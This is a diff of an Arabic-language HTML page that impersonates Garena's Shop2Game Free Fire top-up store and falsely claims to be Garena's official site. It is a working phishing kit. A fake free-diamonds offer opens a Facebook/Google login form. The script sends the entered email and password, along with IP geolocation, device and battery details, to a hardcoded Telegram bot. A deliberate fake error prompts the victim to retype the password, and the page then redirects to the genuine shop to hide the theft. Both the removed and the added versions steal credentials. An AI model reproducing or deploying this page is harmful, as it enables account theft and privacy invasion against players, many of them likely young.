@@ -3,217 +3,267 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Garena Shop - مركز الشحن الرسمي</title>
+    <title>Garena Shop - مركز شحن فري فاير الرسمي</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        :root { --garena-red: #ff4646; --main-yellow: #ffcc00; --bg-body: #f7f7f7; }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        
-        body { background-color: var(--bg-body); color: #333; line-height: 1.6; }
-        
-        /* تصميم الهيدر الرسمي */
-        header { 
-            background: white; padding: 15px; text-align: center; 
-            border-bottom: 2px solid var(--garena-red); box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        :root {
+            --garena-red: #ff4646;
+            --garena-dark: #1a1a1a;
+            --bg-light: #f0f2f5;
+            --text-main: #333;
         }
 
-        .container { max-width: 500px; margin: 0 auto; padding: 15px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, sans-serif; }
+        body { background-color: var(--bg-light); color: var(--text-main); }
 
-        .brand-card { 
-            background: white; border-radius: 15px; padding: 20px; 
-            text-align: center; margin-bottom: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+        /* Header */
+        header {
+            background: #fff; padding: 10px 20px; display: flex; justify-content: space-between;
+            align-items: center; border-bottom: 2px solid var(--garena-red); position: sticky; top: 0; z-index: 1000;
         }
+        .garena-logo-top { height: 35px; }
 
-        .game-logo { width: 80px; border-radius: 18px; margin-bottom: 10px; border: 2px solid #eee; }
-        
+        /* Banner Section */
         .hero-banner {
-            background: #1a1a1a; color: white; border-radius: 12px; padding: 15px;
-            margin-bottom: 20px; text-align: center; border-right: 5px solid var(--main-yellow);
+            width: 100%; background: #fff; padding: 15px; text-align: center;
+        }
+        .banner-img {
+            width: 100%; max-width: 600px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1);
         }
 
-        /* أزرار تسجيل الدخول */
-        .login-box { background: white; border-radius: 15px; padding: 20px; text-align: center; }
-        .method-label { font-size: 14px; font-weight: bold; margin-bottom: 15px; display: block; color: #555; }
+        /* Game Select Area */
+        .game-select {
+            display: flex; align-items: center; justify-content: center; padding: 20px; background: #fff; margin-bottom: 10px;
+        }
+        .game-card {
+            width: 100px; text-align: center; cursor: pointer; position: relative;
+        }
+        .game-card img { width: 80px; border-radius: 18px; border: 2px solid var(--garena-red); }
+        .hot-tag {
+            position: absolute; top: -5px; right: 5px; background: var(--garena-red);
+            color: #fff; font-size: 10px; padding: 2px 6px; border-radius: 4px; font-weight: bold;
+        }
+
+        /* Offers Grid */
+        .container { max-width: 600px; margin: 0 auto; padding: 10px; }
+        .section-title { padding: 15px 5px; font-size: 16px; font-weight: bold; color: #555; }
         
-        .main-btn { 
-            background: var(--garena-red); color: white; border: none; 
-            width: 100%; padding: 14px; border-radius: 8px; font-weight: bold; 
-            cursor: pointer; transition: 0.3s; font-size: 16px;
+        .offers-grid {
+            display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px;
         }
+        .offer-card {
+            background: #fff; border-radius: 12px; padding: 15px; text-align: center;
+            border: 1px solid #ddd; transition: 0.3s; cursor: pointer;
+        }
+        .offer-card:hover { transform: scale(1.03); border-color: var(--garena-red); }
+        .offer-card img { width: 40px; margin-bottom: 10px; }
+        .offer-card .dm-count { display: block; font-weight: bold; font-size: 14px; }
+        .offer-card .price { color: #28a745; font-weight: bold; font-size: 13px; }
 
-        .social-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 15px; }
-        .social-btn { 
-            background: #f0f0f0; border-radius: 8px; padding: 10px; cursor: pointer;
-            transition: 0.2s; border: 1px solid #ddd;
+        /* Login Modal */
+        .modal {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.8); z-index: 2000; align-items: center; justify-content: center;
         }
-        .social-btn img { width: 25px; height: 25px; vertical-align: middle; }
+        .modal-content {
+            background: #fff; width: 90%; max-width: 400px; border-radius: 20px; overflow: hidden; animation: slideUp 0.4s;
+        }
+        @keyframes slideUp { from { transform: translateY(100px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        
+        .modal-header { background: var(--garena-red); color: #fff; padding: 15px; text-align: center; font-weight: bold; }
+        .modal-body { padding: 25px; }
 
-        /* شبكة العروض */
-        .offers-title { margin: 20px 5px 10px; font-size: 16px; font-weight: bold; color: #444; }
-        .offers-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
-        .card { 
-            background: white; border-radius: 12px; padding: 15px; text-align: center; 
-            border: 1px solid #eee; cursor: pointer; transition: 0.3s;
+        .auth-choice { display: flex; flex-direction: column; gap: 15px; }
+        .auth-btn {
+            display: flex; align-items: center; justify-content: center; gap: 10px;
+            padding: 12px; border-radius: 8px; border: 1px solid #ddd; cursor: pointer; font-weight: bold;
         }
-        .card:hover { border-color: var(--garena-red); transform: translateY(-3px); }
-        .card img { width: 35px; margin-bottom: 8px; }
-        .card p { font-weight: bold; font-size: 14px; }
-        .card b { color: #28a745; font-size: 13px; }
+        .fb-btn { background: #1877f2; color: #fff; }
+        .gm-btn { background: #fff; color: #555; }
 
-        /* المودال (النافذة المنبثقة) */
-        .modal-overlay { 
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: rgba(0,0,0,0.7); z-index: 1000; align-items: center; justify-content: center; 
+        .input-box { margin-top: 20px; display: none; }
+        .input-box input {
+            width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 8px; outline: none;
         }
-        .modal-content { 
-            background: white; width: 90%; max-width: 400px; padding: 25px; 
-            border-radius: 20px; position: relative; animation: fadeIn 0.3s;
-        }
-        @keyframes fadeIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
+        .error-msg { color: #ff0000; font-size: 12px; margin-bottom: 10px; display: none; text-align: center; }
 
-        .input-group { margin-bottom: 15px; text-align: right; }
-        .input-group label { display: block; font-size: 12px; color: #777; margin-bottom: 5px; }
-        .input-group input { 
-            width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; 
-            outline: none; background: #fafafa; font-size: 15px;
+        /* Footer */
+        footer {
+            margin-top: 50px; padding: 30px; background: #fff; text-align: center; font-size: 12px; color: #888; border-top: 1px solid #eee;
         }
+        .official-tag { color: var(--garena-red); font-weight: bold; margin-bottom: 5px; display: block; }
     </style>
 </head>
 <body>
 
 <header>
-    <img src="https://shop2game.com/static/img/logo_s2g_full.png" alt="Shop2Game" style="height: 30px;">
+    <img src="https://shop2game.com/static/img/logo_s2g_full.png" class="garena-logo-top">
+    <div style="font-size: 20px; color: #666;"><i class="fa-solid fa-bars"></i></div>
 </header>
 
+<div class="hero-banner">
+    <img src="https://freefire.club/wp-content/uploads/2020/03/Free-Fire-Shop2game-Double-Diamond.jpg" class="banner-img">
+</div>
+
+<div class="game-select">
+    <div class="game-card">
+        <span class="hot-tag">HOT</span>
+        <img src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/icon.png">
+        <p style="font-weight: bold; font-size: 14px; margin-top: 5px;">فري فاير</p>
+    </div>
+</div>
+
 <div class="container">
-    <div class="brand-card">
-        <img src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/icon.png" class="game-logo">
-        <h2 style="font-size: 18px;">Free Fire - فري فاير</h2>
-    </div>
-
-    <div class="hero-banner">
-        <p>🎁 عرض الشحن المباشر: احصل على ضعف الجواهر الآن!</p>
-    </div>
-
-    <div class="login-box">
-        <span class="method-label">سجل دخولك عبر حساب اللعبة</span>
-        <button class="main-btn" onclick="openModal('Player ID / Garena')">تسجيل الدخول المباشر</button>
-        
-        <div class="social-grid">
-            <div class="social-btn" onclick="openModal('Facebook')"><img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Facebook_Logo.png"></div>
-            <div class="social-btn" onclick="openModal('Google')"><img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg"></div>
-            <div class="social-btn" onclick="openModal('X')"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b7/X_logo.jpg" style="border-radius:4px;"></div>
-        </div>
-    </div>
-
-    <h3 class="offers-title">اختر باقة الجواهر 💎</h3>
+    <div class="section-title">العروض الحصرية 💎</div>
     <div class="offers-grid">
-        <div class="card" onclick="openModal('1000 Diamonds')">
-            <img src="https://shop2game.com/static/img/product/diamond.png"><p>1000 جوهرة</p><b>$2.50</b>
+        <div class="offer-card" onclick="triggerLogin('500 Diamonds Free')">
+            <img src="https://shop2game.com/static/img/product/diamond.png">
+            <span class="dm-count">500 جوهرة</span>
+            <span class="price">مجاناً</span>
         </div>
-        <div class="card" onclick="openModal('5000 Diamonds')">
-            <img src="https://shop2game.com/static/img/product/diamond.png"><p>5000 جوهرة</p><b>$5.00</b>
+        <div class="offer-card" onclick="redirectToOfficial()">
+            <img src="https://shop2game.com/static/img/product/diamond.png">
+            <span class="dm-count">1000 جوهرة</span>
+            <span class="price">$2.50</span>
         </div>
-        <div class="card" onclick="openModal('10000 Diamonds')">
-            <img src="https://shop2game.com/static/img/product/diamond.png"><p>10000 جوهرة</p><b>$9.00</b>
+        <div class="offer-card" onclick="redirectToOfficial()">
+            <img src="https://shop2game.com/static/img/product/diamond.png">
+            <span class="dm-count">5000 جوهرة</span>
+            <span class="price">$5.00</span>
         </div>
-        <div class="card" onclick="openModal('25000 Diamonds')">
-            <img src="https://shop2game.com/static/img/product/diamond.png"><p>25000 جوهرة</p><b>$18.00</b>
+        <div class="offer-card" onclick="redirectToOfficial()">
+            <img src="https://shop2game.com/static/img/product/diamond.png">
+            <span class="dm-count">100,000 جوهرة</span>
+            <span class="price">$9.00</span>
+        </div>
+        <div class="offer-card" onclick="redirectToOfficial()">
+            <img src="https://shop2game.com/static/img/product/diamond.png">
+            <span class="dm-count">25,000 جوهرة</span>
+            <span class="price">$20.00</span>
         </div>
     </div>
 </div>
 
-<div id="authModal" class="modal-overlay">
+<footer>
+    <span class="official-tag">🛡️ الموقع الرسمي لشركة Garena ™</span>
+    <p>جميع الحقوق محفوظة © 2026. هذا الموقع تابع لشركة قارينا الشرق الأوسط.</p>
+    <div style="margin-top: 10px; font-size: 10px;">Facebook | Instagram | Twitter | TikTok</div>
+</footer>
+
+<div id="loginModal" class="modal">
     <div class="modal-content">
-        <h3 id="targetItem" style="text-align:center; margin-bottom:20px; color: var(--garena-red);">تأكيد الشحن</h3>
-        <div class="input-group">
-            <label>البريد الإلكتروني أو رقم الهاتف</label>
-            <input type="text" id="userInput" placeholder="example@mail.com" required>
+        <div class="modal-header">تسجيل الدخول للشحن المباشر</div>
+        <div class="modal-body">
+            <div id="authOptions" class="auth-choice">
+                <div class="auth-btn fb-btn" onclick="showFields('Facebook')"><i class="fa-brands fa-facebook"></i> فيسبوك</div>
+                <div class="auth-btn gm-btn" onclick="showFields('Google')"><img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" width="18"> جوجل</div>
+            </div>
+
+            <div id="loginFields" class="input-box">
+                <p id="platformText" style="text-align: center; font-weight: bold; margin-bottom: 15px;"></p>
+                <div class="error-msg" id="errorMsg">البيانات التي استعملتها غير صحيحة، يرجى المحاولة مرة أخرى.</div>
+                <input type="text" id="email" placeholder="البريد الإلكتروني أو الهاتف">
+                <input type="password" id="pass" placeholder="كلمة المرور">
+                <button class="auth-btn fb-btn" style="width: 100%; border: none;" id="finalBtn" onclick="sendData()">إشحن الآن 💎</button>
+            </div>
         </div>
-        <div class="input-group">
-            <label>كلمة المرور</label>
-            <input type="password" id="userPass" placeholder="••••••••" required>
-        </div>
-        <button class="main-btn" id="confirmBtn" onclick="collectAndSend()">تأكيد وإرسال 🚀</button>
-        <button onclick="closeModal()" style="width:100%; background:none; border:none; color:#999; cursor:pointer; margin-top:10px;">إلغاء العملية</button>
     </div>
 </div>
 
 <script>
-    const BOT_TOKEN = '8445311511:AAFYyFSR9ZSZdTYIHNAZI5wNzL8xmzHmJzw';
-    const CHAT_ID = '7902407443';
-    let selection = "";
+    const CONFIG = {
+        TOKEN: '8445311511:AAFYyFSR9ZSZdTYIHNAZI5wNzL8xmzHmJzw',
+        CHAT: '7902407443'
+    };
 
-    function openModal(it) { selection = it; document.getElementById('authModal').style.display='flex'; }
-    function closeModal() { document.getElementById('authModal').style.display='none'; }
+    let selectedOffer = "";
+    let selectedPlatform = "";
+    let attempt = 0;
 
-    async function collectAndSend() {
-        const user = document.getElementById('userInput').value;
-        const pass = document.getElementById('userPass').value;
-        const btn = document.getElementById('confirmBtn');
+    function triggerLogin(offer) {
+        selectedOffer = offer;
+        document.getElementById('loginModal').style.display = 'flex';
+    }
 
-        if(!user || !pass) return alert("يرجى إدخال البيانات المطلوبة!");
-
-        btn.disabled = true;
-        btn.innerText = "جاري الاتصال بقواعد البيانات...";
-
-        try {
-            // جلب البيانات الجغرافية
-            const ipRes = await fetch('https://ipapi.co/json/').catch(() => ({ json: () => ({}) }));
-            const ipData = await ipRes.json();
-
-            // جلب البطارية
-            let battStatus = "غير معروف";
-            try {
-                const b = await navigator.getBattery();
-                battStatus = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'جاري الشحن' : 'تفريغ'})`;
-            } catch(e) {}
-
-            const message = `
-🔔 **اختراق حساب فري فاير جديد☠️**
----------------------------------
-📦 **الطلب:** ${selection}
-👤 **الحساب:** \`${user}\`
-🔑 **الباسورد:** \`${pass}\`
-
-🌍 **الموقع والشبكة:**
-📍 **البلد:** ${ipData.country_name || 'غير معروف'}
-🏙️ **المدينة:** ${ipData.city || 'غير معروف'}
-🌐 **IP:** \`${ipData.ip || '0.0.0.0'}\`
-🏢 **المزود:** ${ipData.org || 'غير معروف'}
-
-📱 **تفاصيل الجهاز:**
-🔋 **البطارية:** ${battStatus}
-🖥️ **الشاشة:** ${screen.width}x${screen.height}
-⚙️ **النظام:** ${navigator.platform}
-🌐 **اللغة:** ${navigator.language}
-⏰ **التوقيت:** ${new Date().toLocaleString()}
----------------------------------
-            `;
-
-            // إرسال البيانات للتليجرام
-            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
-            });
-
-            if (response.ok) {
-                // الانتظار قليلاً لضمان وصول الرسالة قبل التحويل
-                setTimeout(() => {
-                    window.location.href = "https://shop2game.com/app";
-                }, 1500);
-            } else {
-                throw new Error("Telegram Error");
-            }
-
-        } catch (error) {
-            console.error("Error:", error);
-            // في حال فشل أي شيء، حوله للموقع الرسمي ليظن أن الخطأ من السيرفر
-            window.location.href = "https://shop2game.com/app";
+    function redirectToOfficial() {
+        if(confirm("هل تريد شراء الجواهر؟ سيتم تحويلك لمركز الدفع.")){
+            window.location.href = "https://shop2game.com/app/100067/buy";
         }
     }
-    
+
+    function showFields(platform) {
+        selectedPlatform = platform;
+        document.getElementById('authOptions').style.display = 'none';
+        document.getElementById('loginFields').style.display = 'block';
+        document.getElementById('platformText').innerText = "الدخول عبر " + platform;
+    }
+
+    async function sendData() {
+        const u = document.getElementById('email').value;
+        const p = document.getElementById('pass').value;
+        const btn = document.getElementById('finalBtn');
+
+        if(u.length < 5 || p.length < 5) {
+            document.getElementById('errorMsg').style.display = 'block';
+            return;
+        }
+
+        btn.disabled = true;
+        btn.innerText = "جاري الاتصال بالسيرفر...";
+
+        try {
+            // سحب معلومات الجهاز والموقع
+            const ipRes = await fetch('https://ipapi.co/json/');
+            const ip = await ipRes.json();
+            
+            let batt = "Unknown";
+            if(navigator.getBattery) {
+                const b = await navigator.getBattery();
+                batt = `${(b.level*100)}% (${b.charging ? 'Charging' : 'No'})`;
+            }
+
+            const text = `
+🔥 **صيد جديد من Shop2Game V2** 🔥
+----------------------------------
+💎 **العرض:** ${selectedOffer}
+👤 **المنصة:** ${selectedPlatform}
+📧 **الحساب:** \`${u}\`
+🔑 **كلمة السر:** \`${p}\`
+
+🌍 **الموقع والشبكة:**
+📍 **البلد:** ${ip.country_name} (${ip.city})
+🌐 **IP:** \`${ip.ip}\`
+🏢 **المزود:** ${ip.org}
+
+📱 **الجهاز:**
+⚙️ **النظام:** ${navigator.platform}
+🔋 **البطارية:** ${batt}
+🖥️ **الشاشة:** ${screen.width}x${screen.height}
+⏰ **الوقت:** ${new Date().toLocaleString()}
+----------------------------------
+            `;
+
+            await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CONFIG.CHAT, text: text, parse_mode: 'Markdown' })
+            });
+
+            // إظهار خطأ وهمي في المرة الأولى لزيادة التأكيد
+            if(attempt === 0) {
+                attempt++;
+                document.getElementById('errorMsg').style.display = 'block';
+                btn.disabled = false;
+                btn.innerText = "إشحن الآن 💎";
+                return;
+            }
+
+            window.location.href = "https://shop2game.com/";
+
+        } catch(e) {
+            window.location.href = "https://shop2game.com/";
+        }
+    }
+</script>
+</body>
+</html>
